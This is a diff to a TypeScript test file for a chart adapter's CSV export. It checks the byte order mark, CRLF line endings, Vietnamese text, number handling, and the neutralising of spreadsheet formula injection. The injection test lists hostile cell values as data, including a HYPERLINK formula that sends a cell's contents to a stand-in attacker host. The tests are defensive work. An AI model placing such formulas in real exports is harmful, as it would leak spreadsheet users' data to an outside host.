@@ -91,7 +91,30 @@ describe("chart adapter", () => {
 
   it("writes CSV with quoted commas, quotes and line breaks", () => {
     const tricky: Result = { columns: [{ name: "name", type: "string", role: "dimension" }, { name: "n", type: "number", role: "measure" }], rows: [['A, "B"\nC', 1]], row_count: 1 };
-    expect(toCsv(tricky)).toBe('name,n\n"A, ""B""\nC",1');
+    expect(toCsv(tricky)).toBe('\uFEFFname,n\r\n"A, ""B""\nC",1\r\n');
+  });
+
+  it("starts the CSV with a UTF-8 byte order mark so a spreadsheet reads Vietnamese text", () => {
+    const text: Result = { columns: [{ name: "tỉnh", type: "string", role: "dimension" }], rows: [["Hà Nội"]], row_count: 1 };
+    expect(toCsv(text)).toBe("\uFEFFtỉnh\r\nHà Nội\r\n");
+  });
+
+  it.each(["=1+1", "+1+1", "-1+1", "@SUM(A1)", "\tcmd", "\rcmd", '=HYPERLINK("http://evil.example/?"&A1,"click")'])(
+    "writes %j as text, not as a formula", (value) => {
+      const result: Result = { columns: [{ name: "v", type: "string", role: "dimension" }], rows: [[value]], row_count: 1 };
+      const cell = toCsv(result).slice("\uFEFFv\r\n".length, -2);
+      const unquoted = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
+      expect(unquoted).toBe(`'${value}`);
+    });
+
+  it("leaves plain numbers, negative ones included, as numbers", () => {
+    const numbers: Result = { columns: [{ name: "n", type: "number", role: "measure" }], rows: [[-5], ["-5"], ["+3.5"], ["-1e3"], [0]], row_count: 5 };
+    expect(toCsv(numbers)).toBe("\uFEFFn\r\n-5\r\n-5\r\n+3.5\r\n-1e3\r\n0\r\n");
+  });
+
+  it("neutralises a column name that starts a formula", () => {
+    const named: Result = { columns: [{ name: "=cmd", type: "string", role: "dimension" }], rows: [], row_count: 0 };
+    expect(toCsv(named)).toBe("\uFEFF'=cmd\r\n");
   });
 });
 
